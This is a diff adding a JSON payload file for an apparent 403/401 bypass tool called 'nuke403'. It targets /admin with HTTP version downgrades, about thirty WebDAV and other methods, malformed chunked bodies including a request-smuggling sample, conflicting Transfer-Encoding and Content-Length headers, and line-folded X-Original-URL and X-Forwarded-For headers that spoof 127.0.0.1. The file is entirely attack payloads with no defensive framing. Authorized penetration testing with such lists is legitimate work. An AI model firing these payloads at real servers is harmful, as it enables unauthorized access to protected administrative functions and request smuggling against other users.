@@ -1,0 +1,102 @@
+{
+  "version": "1.0.0",
+  "description": "Protocol-level bypass techniques for 403/401 bypass",
+  "last_updated": "2023-07-20",
+  "techniques": [
+    {
+      "category": "http_version",
+      "description": "HTTP version manipulation techniques",
+      "payloads": [
+        {"version": "HTTP/0.9", "method": "GET", "path": "/admin"},
+        {"version": "HTTP/1.0", "method": "GET", "path": "/admin"},
+        {"version": "HTTP/1.1", "method": "GET", "path": "/admin"},
+        {"version": "HTTP/2", "method": "GET", "path": "/admin"},
+        {"version": "HTTP/2", "method": "GET", "path": "/admin", "pseudo_headers": true}
+      ]
+    },
+    {
+      "category": "method_manipulation",
+      "description": "HTTP method manipulation techniques",
+      "payloads": [
+        {"method": "GET", "path": "/admin"},
+        {"method": "POST", "path": "/admin"},
+        {"method": "PUT", "path": "/admin"},
+        {"method": "DELETE", "path": "/admin"},
+        {"method": "HEAD", "path": "/admin"},
+        {"method": "OPTIONS", "path": "/admin"},
+        {"method": "PATCH", "path": "/admin"},
+        {"method": "TRACE", "path": "/admin"},
+        {"method": "CONNECT", "path": "/admin"},
+        {"method": "PROPFIND", "path": "/admin"},
+        {"method": "PROPPATCH", "path": "/admin"},
+        {"method": "MKCOL", "path": "/admin"},
+        {"method": "COPY", "path": "/admin"},
+        {"method": "MOVE", "path": "/admin"},
+        {"method": "LOCK", "path": "/admin"},
+        {"method": "UNLOCK", "path": "/admin"},
+        {"method": "VERSION-CONTROL", "path": "/admin"},
+        {"method": "REPORT", "path": "/admin"},
+        {"method": "CHECKOUT", "path": "/admin"},
+        {"method": "CHECKIN", "path": "/admin"},
+        {"method": "UNCHECKOUT", "path": "/admin"},
+        {"method": "MKWORKSPACE", "path": "/admin"},
+        {"method": "UPDATE", "path": "/admin"},
+        {"method": "LABEL", "path": "/admin"},
+        {"method": "MERGE", "path": "/admin"},
+        {"method": "BASELINE-CONTROL", "path": "/admin"},
+        {"method": "MKACTIVITY", "path": "/admin"},
+        {"method": "ORDERPATCH", "path": "/admin"},
+        {"method": "ACL", "path": "/admin"},
+        {"method": "SEARCH", "path": "/admin"}
+      ]
+    },
+    {
+      "category": "chunked_encoding",
+      "description": "Chunked encoding manipulation techniques",
+      "payloads": [
+        {"encoding": "chunked", "data": "0\r\n\r\n"},
+        {"encoding": "chunked", "data": "7\r\nnuke403\r\n0\r\n\r\n"},
+        {"encoding": "chunked", "data": "5\r\nbypass\r\n0\r\n\r\n"},
+        {"encoding": "chunked", "data": "7\r\nadmin\r\n0\r\n\r\n"},
+        {"encoding": "chunked", "data": "invalid\r\nnuke403\r\n0\r\n\r\n"},
+        {"encoding": "chunked", "data": "7\r\nbypass", "malformed": true},
+        {"encoding": "chunked", "data": "7\r\nnuke403\r\n0\r\n\r\nG", "smuggling": true}
+      ]
+    },
+    {
+      "category": "header_manipulation",
+      "description": "Protocol header manipulation techniques",
+      "payloads": [
+        {"headers": {"Transfer-Encoding": "chunked", "Content-Length": "0"}},
+        {"headers": {"Transfer-Encoding": "chunked", "Content-Length": "100"}},
+        {"headers": {"Content-Length": "0", "Transfer-Encoding": "chunked"}},
+        {"headers": {"Content-Length": "100", "Transfer-Encoding": "chunked"}},
+        {"headers": {"Transfer-Encoding": "chunked, identity"}},
+        {"headers": {"Transfer-Encoding": "identity, chunked"}},
+        {"headers": {"Content-Length": "-1"}},
+        {"headers": {"Content-Length": "1000000000"}},
+        {"headers": {"Content-Length": "A"}},
+        {"headers": {"Connection": "close, keep-alive"}},
+        {"headers": {"Connection": "keep-alive, close"}}
+      ]
+    },
+    {
+      "category": "line_folding",
+      "description": "HTTP header line folding techniques",
+      "payloads": [
+        {"headers": {"X-Original-URL": "\r\n /admin"}},
+        {"headers": {"X-Forwarded-For": "\r\n 127.0.0.1"}},
+        {"headers": {"X-Original-URL": "\r\n\t/admin"}},
+        {"headers": {"X-Forwarded-For": "\r\n\t127.0.0.1"}},
+        {"headers": {"X-Original-URL": "\n /admin"}},
+        {"headers": {"X-Forwarded-For": "\n 127.0.0.1"}},
+        {"headers": {"X-Original-URL": "\n\t/admin"}},
+        {"headers": {"X-Forwarded-For": "\n\t127.0.0.1"}},
+        {"headers": {"X-Original-URL": "\u2028/admin"}},
+        {"headers": {"X-Forwarded-For": "\u2028127.0.0.1"}},
+        {"headers": {"X-Original-URL": "\u2029/admin"}},
+        {"headers": {"X-Forwarded-For": "\u2029127.0.0.1"}}
+      ]
+    }
+  ]
+}
